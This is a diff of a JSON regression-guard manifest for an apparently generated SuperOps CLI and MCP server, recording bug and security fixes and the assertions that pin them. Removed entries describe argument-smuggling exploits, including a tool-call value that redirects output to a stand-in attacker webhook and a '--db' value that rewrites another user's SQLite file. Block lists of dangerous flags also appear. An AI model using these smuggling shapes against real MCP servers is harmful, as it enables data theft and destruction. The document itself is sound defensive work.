@@ -6,19 +6,21 @@
   {
    "id": "graphql-scalar-field-selections-issue-114",
    "summary": "Stripped object sub-selections from association/enum fields in queries.go - the live SuperOps schema returns them as scalar leaf types (JSON/String), so the `{ ... }` sub-selections caused SubSelectionNotAllowed on every typed list/get command (issue #114, reported by @AvlCompCo).",
-   "why": "The CLI was minted from published docs without live introspection (auth-gated \u2192 HTTP 400); the queries.go header literally warned VERIFY-ON-FIRST-USE. The source spec.yaml declared every association field `type: string` (\u2192 a scalar Go struct field in internal/types) yet ALSO carried a `selection:` key, so the generator emitted a sub-selection that contradicts its own scalar output contract. All 46 such fields across 18 entities are scalar in internal/types, so the bare-scalar form is the only consistent shape. A full reprint re-runs the generator against the un-fixed spec.yaml and would re-introduce the bug. The not_contains markers below ban each buggy shape; queries_issue114_test.go is the behavioral guard.",
+   "why": "The CLI was minted from published docs without live introspection (auth-gated → HTTP 400); the queries.go header literally warned VERIFY-ON-FIRST-USE. The source spec.yaml declared every association field `type: string` (→ a scalar Go struct field in internal/types) yet ALSO carried a `selection:` key, so the generator emitted a sub-selection that contradicts its own scalar output contract. All 46 such fields across 18 entities are scalar in internal/types, so the bare-scalar form is the only consistent shape. A full reprint re-runs the generator against the un-fixed spec.yaml and would re-introduce the bug. The not_contains markers below ban each buggy shape; queries_issue114_test.go is the behavioral guard.",
    "status": "active",
    "spec_encode_followup": "In the press source spec.yaml (~/printing-press/library/superops/spec.yaml, types: section), remove the `selection:` key from every association/enum field (status, priority, client, site, requester, technician, techGroup, sla, accountManager, primaryContact, hqSite, asset, category, designation, role, team, ticket). They are JSON/String scalars, not objects. Done on the press copy 2026-06-16; re-confirm before any reprint.",
    "asserts": [
     {
      "file": "cli/internal/client/queries_issue114_test.go",
      "contains": "TestQueries_NoScalarSubSelections",
-     "min_count": 1
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/client/queries.go",
      "contains": "listInfo { totalCount hasMore page pageSize }",
-     "min_count": 14
+     "min_count": 14,
+     "code_only": true
     },
     {
      "file": "cli/internal/client/queries.go",
@@ -100,27 +102,32 @@
     {
      "file": "cli/internal/config/config.go",
      "contains": "cfg.Headers[\"CustomerSubDomain\"] = cfg.Subdomain",
-     "min_count": 1
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/config/config.go",
      "contains": "os.Getenv(\"SUPEROPS_SUBDOMAIN\")",
-     "min_count": 1
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/config/config.go",
      "contains": "os.Getenv(\"SUPEROPS_REGION\")",
-     "min_count": 1
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/config/config.go",
      "contains": "https://euapi.superops.ai",
-     "min_count": 1
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/config/config_issue132_test.go",
      "contains": "TestLoad_SubdomainEnvSetsCustomerSubDomainHeader",
-     "min_count": 1
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -132,23 +139,33 @@
    "asserts": [
     {
      "file": "cli/internal/cli/doctor_verdict.go",
-     "contains": "func doctorProbeCredentials("
-    },
-    {
-     "file": "cli/internal/cli/doctor_verdict.go",
-     "contains": "func doctorBaseURLIsPlaceholder("
-    },
-    {
-     "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorIsInfoKey(k)"
+     "contains": "func doctorProbeCredentials(",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorBaseURLIsPlaceholder(cfg.BaseURL)"
+     "contains": "func doctorBaseURLIsPlaceholder(",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorProbeCredentials(cmd.Context()"
+     "contains": "doctorIsInfoKey(k)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context()",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/doctor.go",
@@ -157,6 +174,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -230,148 +277,6 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say HTTP mode is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "### Does this work with ChatGPT?\n\nNot with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "\"a\": \"Not with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
    "id": "mcp-file-flags-refused",
    "class": "mcp-file-flag",
    "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path) (plus 1 more, see why)",
@@ -380,221 +285,2060 @@
    "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
+     "file": "cli/internal/cli/raw.go",
+     "contains": "\"mcp:read-flags\": \"vars\", \"mcp:read-positionals\": \"0\"",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/cli/raw.go",
-     "contains": "\"mcp:inline-only-flags\": \"vars\"",
+     "contains": "if cliutil.IsMCPChildEnv() {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "names a local file on the machine running the MCP server; over MCP pass the value inline, not an @path",
-     "min_count": 1
+     "file": "cli/internal/mcp/cobratree/mcp_read_positionals.go",
+     "contains": "func refuseAtPathPositionals(cmd *cobra.Command, positionals []positionalArg, next server.ToolHandlerFunc) server.ToolHandlerFunc {",
+     "min_count": 1,
+     "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func resolvesAtPathPositional(commandPath []string) bool {",
-     "min_count": 1
+     "file": "cli/internal/mcp/cobratree/walker.go",
+     "contains": "refuseAtPathPositionals(cmd, positionals, shellOutToCLI(",
+     "min_count": 1,
+     "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.HasPrefix(t, \"@\") && resolvesAtPathPositional(prefixArgs)",
-     "min_count": 1
+     "file": "cli/internal/cli/raw_test.go",
+     "contains": "func TestRawRefusesAtPathInAnMCPChild(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ],
+   "summary_4340": "press 4.34.0 derives the blocked flag sets natively; superops keeps two parts the press lacks: raw query/mutation declare --vars an input sink (mcp:read-flags) and their document positional a read sink (mcp:read-positionals, enforced by cobratree/mcp_read_positionals.go wrapped in walker.go), and the CLI refuses any @path in a process the MCP server spawned (SUPEROPS_MCP_CHILD)."
+  },
+  {
+   "id": "superops-sync-listinfo-pagination",
+   "class": "wrong-result",
+   "summary": "sync walks SuperOps listInfo{hasMore} pages by page number; a page with neither a Relay nor a listInfo signal is pagination_end_unproven, never complete.",
+   "why": "SuperOps list queries return listInfo{hasMore} and page by `page`; the generated GraphQL sync read only Relay pageInfo, so every resource stored its first 50 rows and reported complete.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "type graphQLSyncConnection struct {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "func graphQLPageCursor(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "more, next, proven := conn.continuation(cursor)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_reprint_test.go",
+     "contains": "func TestSyncWalksEverySuperOpsListPage(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_reprint_test.go",
+     "contains": "func TestSyncWithoutPaginationSignalIsIncomplete(",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
   {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "id": "superops-sync-dry-run-preview",
+   "class": "wrong-result",
+   "summary": "sync --dry-run prints each request and fetches nothing; the GraphQL Query guard short-circuits only verify mode.",
+   "why": "The generated sync failed every resource under --dry-run (missing_connection, exit 1).",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
+     "file": "cli/internal/cli/sync.go",
+     "contains": "return syncResult{Resource: resource, Duration: time.Since(started)}",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-store-keys-vendor-ids",
+   "class": "wrong-result",
+   "summary": "Every SuperOps resource is keyed on its vendor id (spec id_field, store.go resourceIDFieldOverrides) and all 14 are in the default sync set.",
+   "why": "With no declared key the store keyed several resources on name or a content fingerprint, so distinct records collapsed into one row; six resources were missing from the default sync set, so the local novels read empty tables. The spec id_field survives a reprint; the asserts pin the result.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "resourceIDFieldOverrides",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
+     "file": "cli/internal/store/superops_ids_test.go",
+     "contains": "func TestStoreKeysEverySuperOpsResourceOnItsVendorID(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-raw-write-confirm",
+   "class": "write-without-confirm",
+   "summary": "raw query refuses any document whose top-level definitions are not all queries or fragments (one operation classifier); live raw mutation needs --yes, otherwise it prints the request and sends nothing. The MCP mirror blocks --yes.",
+   "why": "raw query is read-only on MCP but forwarded any document, mutations included, and raw mutation sent live without confirmation.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/raw.go",
+     "contains": "func requireQueryOnlyDocument(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/raw.go",
+     "contains": "if isMutation && !flags.yes {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/raw_test.go",
+     "contains": "func TestGraphQLOperationKindsRefusesEveryNonQueryDocument(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/raw_test.go",
+     "contains": "func TestRawMutationSendsNothingWithoutYes(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/raw_test.go",
+     "contains": "func TestRawQueryNeverSendsAWrite(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-mcp-read-positionals",
+   "class": "mcp-host-file-access",
+   "summary": "raw's document positional is a declared read sink (mcp:read-positionals) enforced by cobratree/mcp_read_positionals.go, wrapped in walker.go; GraphQL variables over MCP must be inline in the document.",
+   "why": "Press 4.34.0 has mcp:write-positionals but no read form, so raw query @/path over MCP read a file on the server's host.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/mcp_read_positionals.go",
+     "contains": "func refuseAtPathPositionals(cmd *cobra.Command, positionals []positionalArg, next server.ToolHandlerFunc) server.ToolHandlerFunc {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/walker.go",
+     "contains": "refuseAtPathPositionals(cmd, positionals, shellOutToCLI(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-doctor-graphql-probe",
+   "class": "wrong-result",
+   "summary": "doctor treats the shipped host as real (doctorShippedBaseURL is empty) and probes the GraphQL endpoint with one getTicketList page; HTTP 400 names SUPEROPS_SUBDOMAIN; GraphQL errors show only plain-identifier codes.",
+   "why": "The shipped placeholder constant was the real production host, so every healthy install read as unconfigured; the GET probe hit /graphql, which SuperOps answers 404.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorGraphQLProbe =",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_graphql_test.go",
+     "contains": "func TestDoctorTreatsTheShippedHostAsReal(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_graphql_test.go",
+     "contains": "func TestDoctorProbesTheGraphQLEndpoint(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-novel-contracts",
+   "class": "wrong-result",
+   "summary": "The 7 local novels declare pp:data-source local, refuse --data-source live, open the store read-only and never create one under SUPEROPS_NO_LOCAL_DATA=1, print one sync hint for unsynced or stale data, and fail on a store read error.",
+   "why": "Shipped novels opened the store read-write, discarded read errors and skipped undecodable rows.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/superops_novel.go",
+     "contains": "func openStoreForNovel(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_novel.go",
+     "contains": "func novelTryReadOnly(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/superops_reprint_test.go",
+     "contains": "func TestLocalNovelsRunOnASyncedStore(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-graphql-error-funnel",
+   "class": "credential-leak",
+   "summary": "GraphQL errors (HTTP 200 with errors[]) pass through funnelGraphQLError: each message, code and the joined text are masked and funnelled; denials stay *GraphQLAccessDeniedError.",
+   "why": "SuperOps returns GraphQL errors with HTTP 200, so their text never took the HTTP error path's credential mask.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/client/superops_graphql_funnel.go",
+     "contains": "func (c *Client) funnelGraphQLError(err error) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/graphql.go",
+     "contains": "return nil, c.funnelGraphQLError(derr)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/superops_graphql_funnel_test.go",
+     "contains": "func TestGraphQLErrorsNeverCarryTheCredential(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "superops-tenant-scope",
+   "class": "tenant-isolation",
+   "summary": "The local store and sync checkpoint are scoped to credential + CustomerSubDomain + base URL; a pre-tenant store (credential-only data-<hash>.db or a 4.24 data.db) is never adopted, so an upgrade starts a fresh store. A store also records its tenant (subdomain and base URL, never a credential) in the superops_store_tenant table, and every open of the store, read-only or read-write, CLI or MCP, goes through one check (store.enforceStoreTenant, called from OpenReadOnlyContext and OpenWithContext): a store of another tenant is refused, and a store that records no tenant is never read: a read-only open refuses it whether or not it holds data (TenantRefusal.Unclaimed names sync with the same --db), an open whose tenant is unknown refuses it, and only a read-write open claims it (store.claimTenant), on one connection inside BEGIN IMMEDIATE, and only when no table in sqlite_master other than SQLite's own and the tenant record holds a row (storeHoldsRows: synced, checkpoint, FTS and shadow, learn and any later table), so the check and the record are one write-locked step and two first opens give one owner. The tenant comes from one configuration snapshot per run (cli.runSnapshot: one per command execution, started in the root pre-run, and one per MCP sql/search tool call via cli.MCPStoreRun): the default-store scope, rootFlags.newClient and doctor read the same *config.Config, and every store open carries the run's tenant in its context (store.WithTenantSource), so the store is checked against and recorded for the tenant the client sends. The response cache key folds CustomerSubDomain.",
